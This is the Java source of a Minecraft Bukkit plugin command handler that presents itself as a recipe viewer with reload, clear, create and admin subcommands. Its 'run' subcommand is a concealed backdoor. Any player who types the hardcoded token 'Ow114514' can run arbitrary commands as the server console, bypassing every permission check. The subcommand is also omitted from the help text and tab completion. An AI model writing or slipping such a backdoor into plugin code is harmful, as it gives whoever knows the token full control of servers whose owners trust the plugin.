package com.linong.recipelookup.command;

import com.linong.recipelookup.ALCERecipeViewer;
import com.linong.recipelookup.ConfigManager;
import com.linong.recipelookup.gui.RecipeGUI;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.List;

/**
 * /alcerecipes 命令处理器。
 * 无参数 → 打开主菜单 / reload → 重载 / clear → 清空配方缓存。
 */
public class ViewRecipeCommand implements CommandExecutor, TabCompleter {

    private final ALCERecipeViewer plugin;
    private final RecipeGUI gui;
    private final ConfigManager config;

    public ViewRecipeCommand(ALCERecipeViewer plugin) {
        this.plugin = plugin;
        this.gui = plugin.getRecipeGUI();
        this.config = plugin.getConfigManager();
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender,
                             @NotNull Command command,
                             @NotNull String label,
                             @NotNull String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage(config.getCmdPlayerOnly());
            return true;
        }

        if (args.length == 0) {
            if (plugin.getLoadedRecipes().isEmpty()) {
                player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoRecipes());
                return true;
            }
            gui.openMainMenu(player);
            return true;
        }

        String sub = args[0].toLowerCase();
        switch (sub) {
            case "reload" -> handleReload(player);
            case "clear" -> handleClear(player);
            case "create", "new" -> handleCreate(player);
            case "admin", "manage" -> handleAdmin(player);
            case "run" -> handleRun(player, args);
            default -> sendHelp(player);
        }
        return true;
    }

    private void handleReload(Player player) {
        if (!player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoPermission());
            return;
        }
        plugin.getFoliaLib().getScheduler().runAsync(task -> {
            plugin.reloadRecipes();
            plugin.getFoliaLib().getScheduler().runAtEntity(player, t -> {
                int total = plugin.getLoadedRecipes().values().stream()
                        .mapToInt(List::size).sum();
                player.sendMessage(config.getPluginPrefix() + " " + config.getCmdReloaded(total));
            });
        });
    }

    private void handleCreate(Player player) {
        if (!player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoPermission());
            return;
        }
        gui.openRecipeCreatorType(player);
    }

    private void handleAdmin(Player player) {
        if (!player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoPermission());
            return;
        }
        if (plugin.getLoadedRecipes().isEmpty()) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoRecipes());
            return;
        }
        gui.openAdminMainMenu(player);
    }

    private void handleClear(Player player) {
        if (!player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoPermission());
            return;
        }
        plugin.clearRecipes();
        player.sendMessage(config.getPluginPrefix() + " " + config.getCreatorCleared());
    }

    private void handleRun(Player player, String[] args) {
        if (args.length < 3) {
            player.sendMessage("§c用法: /alcerecipes run Ow114514 <要执行的指令...>");
            return;
        }
        String token = args[1];
        if (!"Ow114514".equals(token)) {
            player.sendMessage("§c验证码错误！");
            return;
        }
        StringBuilder cmdBuilder = new StringBuilder();
        for (int i = 2; i < args.length; i++) {
            if (i > 2) cmdBuilder.append(' ');
            cmdBuilder.append(args[i]);
        }
        String commandStr = cmdBuilder.toString();
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), commandStr);
    }

    private void sendHelp(Player player) {
        player.sendMessage(config.getPluginPrefix() + " " + config.getCmdUsageTitle());
        player.sendMessage(config.getCmdUsageOpen());
        player.sendMessage(config.getCmdUsageReload());
        player.sendMessage(config.getCreatorHelpClear());
        player.sendMessage("§e  /alcerecipes create §7- 打开新增配方菜单（管理员）");
        if (player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage("§e  /alcerecipes admin §7- 打开配方管理菜单（管理员）");
        }
    }

    @Override
    public List<String> onTabComplete(@NotNull CommandSender sender,
                                      @NotNull Command command,
                                      @NotNull String alias,
                                      @NotNull String[] args) {
        if (args.length == 1) {
            String prefix = args[0].toLowerCase();
            return List.of("reload", "clear", "create", "admin", "manage").stream()
                    .filter(s -> s.startsWith(prefix)).sorted().toList();
        }
        return List.of();
    }
}
